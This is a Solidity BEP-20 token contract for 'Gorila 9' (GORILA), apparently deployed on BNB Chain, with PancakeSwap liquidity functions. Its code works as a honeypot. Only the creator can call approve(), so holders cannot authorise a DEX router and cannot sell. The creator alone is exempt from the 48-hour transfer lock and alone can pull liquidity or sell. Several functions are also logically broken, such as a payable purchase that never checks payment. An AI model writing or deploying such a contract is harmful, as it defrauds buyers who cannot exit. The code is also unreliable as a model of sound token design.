/**
 *Submitted for verification at BscScan.com on 2023-06-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeRouter02 {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (
        uint256 amountToken,
        uint256 amountETH
    );
}

contract GorilaToken is IERC20 {
    string public name = "Gorila 9";
    string public symbol = "GORILA";
    uint8 public decimals = 18;
    uint256 private _totalSupply = 10000000000 * 10**uint256(decimals);

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _purchaseTimestamps;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private _creatorWallet;
    address private _pancakeRouterAddress; // Store the PancakeSwap Router address instead

    constructor() {
        _creatorWallet = msg.sender;
        _balances[_creatorWallet] = _totalSupply;
        _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap Router Address
        emit Transfer(address(0), _creatorWallet, _totalSupply);
    }

    modifier onlyAfter48Hours(address account) {
        require(_purchaseTimestamps[account] + 48 hours <= block.timestamp || account == _creatorWallet, "Action not yet allowed. Wait for 48 hours.");
        _;
    }

    modifier onlyCreator() {
        require(msg.sender == _creatorWallet, "Only creator can perform this operation");
        _;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) external override onlyAfter48Hours(msg.sender) returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external onlyCreator returns (bool) {
        _approve(_creatorWallet, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external onlyAfter48Hours(sender) returns (bool) {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(_balances[sender] >= amount, "Transfer amount exceeds balance");
        require(_allowances[sender][msg.sender] >= amount, "Transfer amount exceeds allowance");

        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function buyTokens(uint256 amount) external payable {
        require(amount > 0, "Amount must be greater than zero");
        uint256 tokensToBuy = amount * 10**uint256(decimals);
        require(tokensToBuy <= _balances[_creatorWallet], "Not enough tokens available for purchase");
        _purchaseTimestamps[msg.sender] = block.timestamp;
        _transfer(_creatorWallet, msg.sender, tokensToBuy);
    }

    function createPool(uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, uint256 deadline) external payable onlyCreator {
        require(_balances[_creatorWallet] >= amountTokenDesired, "Not enough tokens available to create pool");

        _approve(_creatorWallet, _pancakeRouterAddress, amountTokenDesired); // Approve PancakeSwap router to spend tokens from the creator's wallet

        _balances[_creatorWallet] -= amountTokenDesired;
        _balances[_pancakeRouterAddress] += amountTokenDesired;
        emit Transfer(_creatorWallet, _pancakeRouterAddress, amountTokenDesired);

        IPancakeRouter02 _pancakeRouter = IPancakeRouter02(_pancakeRouterAddress);
        _pancakeRouter.addLiquidityETH{value: msg.value}(
            address(this),
            amountTokenDesired,
            amountTokenMin,
            amountETHMin,
            _creatorWallet,
            deadline
        );
    }

    function removeLiquidity(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        uint256 deadline
    ) external onlyCreator {
        IPancakeRouter02 _pancakeRouter = IPancakeRouter02(_pancakeRouterAddress);
        _pancakeRouter.removeLiquidityETH(
            token,
            liquidity,
            amountTokenMin,
            amountETHMin,
            _creatorWallet,
            deadline
        );
    }

    function sellTokens(uint256 amount) external onlyCreator {
        require(amount > 0, "Amount must be greater than zero");
        uint256 tokensToSell = amount * 10**uint256(decimals);
        require(tokensToSell <= _balances[address(this)], "Not enough tokens to sell");

        _balances[_creatorWallet] += tokensToSell;
        _balances[address(this)] -= tokensToSell;
        emit Transfer(address(this), _creatorWallet, tokensToSell);
    }

    function _transfer(address sender, address recipient, uint256 amount) private onlyAfter48Hours(sender) {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(_balances[sender] >= amount, "Transfer amount exceeds balance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}